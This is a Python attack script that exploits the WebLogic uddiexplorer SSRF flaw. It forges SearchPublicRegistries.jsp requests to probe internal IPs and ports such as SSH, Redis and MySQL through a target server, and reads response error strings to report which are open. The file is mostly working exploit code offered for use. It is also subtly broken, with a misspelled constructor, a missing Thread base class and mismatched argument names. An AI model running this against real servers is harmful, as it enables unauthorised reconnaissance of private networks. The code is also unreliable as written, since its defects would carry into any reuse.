#encoding : utf-8

#weblogic ssrf vuln
import re,threading,queue,argparse
from lib.config import get_requests
from lib.config import logging

Queue = queue.Queue()

class Weblogic(object):

    def __int__(self,queue):
        threading.Thread.__init__(self)
        self.queue = queue
        self.result = []

    def scan(self):
        ssrf_regex = re.compile(r'weblogic.uddi.client.structures.exception.XML_SoapException')
        port_regex = re.compile(r'could not connect over HTTP to server')
        while True:
            if self.queue.empty():
                break
            try:
                url = self.queue.get_nowait()
                r = get_requests(url,timeout=15).content
                if ssrf_regex.search(r) and not port_regex.search(r):
                    regex_ip = re.compile(r'(?:[0-9]{1,3}\.){3}[0-9]{1,3}:[0-9]+')
                    print(regex_ip.findall(url)[-1])
            except Exception as e:
                break


def main(args):
    thread_count = 20

    target = args.target
    ports = [22, 80, 445, 3306, 6379, 7001, 8080, 11211]
    ip_c = args.ip_c

    if ip_c:
        for d in range(0,255):
            ip = "{}.{}".format(ip_c,d)
            for port in ports:
                payload = 'http://{target}:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://{ip}:{port}'.format(target=target, ip=ip, port=port)
                Queue.put(payload)
    else:
        ip = '127.0.0.1'
        for port in ports:
            payload = 'http://{target}:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://{ip}:{port}'.format(target=target, ip=ip, port=port)
            Queue.put(payload)

    threads = []
    for i in range(thread_count):
        threads.append(Weblogic(Queue))
    for t in threads:
        t.start()
    for t in threads:
        t.join()




if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog='ssrfex.py', usage='%(prog)s -u 192.168.1.1 -p 192.168.1', description='ssrf test')
    parser.add_argument("-u", dest="target", type=str, help="url targrt")
    parser.add_argument("-i", dest='ip', type=str, help="probe the network ip")
    args = parser.parse_args()

    try:
        main(args)
    except Exception as e:
        logging.error(str(e))
        exit(1)








